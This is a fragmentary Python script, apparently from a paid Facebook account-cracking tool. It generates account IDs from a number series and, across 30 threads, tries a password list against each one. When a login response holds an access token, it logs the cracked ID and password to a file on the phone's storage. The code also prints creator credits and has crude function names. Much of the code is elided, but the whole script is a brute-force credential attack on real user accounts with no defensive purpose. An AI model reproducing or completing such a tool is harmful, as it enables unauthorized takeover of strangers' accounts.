...
def fuckMyxAXN(series):
   ...
   # os.system("xdg-open https://t.me/H41NA_SIKRA")
    ...
    with ThreadPoolExecutor(max_workers=30) as Fuck_xnxx:
        ...
        print("CREATOR:-Krish Era")
        print("TOOL :- PAID ")
        print("FACEBOOK ;- Krish Era")
        print("Use 1.1.1.1 FOR MORE OK ID ")
        print("-------------------------------")
        for love in gen:
            ids = SEX + love
...
def Fucking_life(ids, passlist):
    global loop, oks, cps
    sys.stdout.write(f"\rKrish  [{loop}]|OK:[{len(cps)}]")
    sys.stdout.flush()
    try:
        for pas in passlist:
            ...
            if "access_token" in response:
                print(f"\r\r\x1bKrish _HO-OK | {ids} • {pas}")
                open("/sdcard/ADI-OK.txt", "a").write(ids + "|" + pas + "\n")
                oks.append(ids)
                break
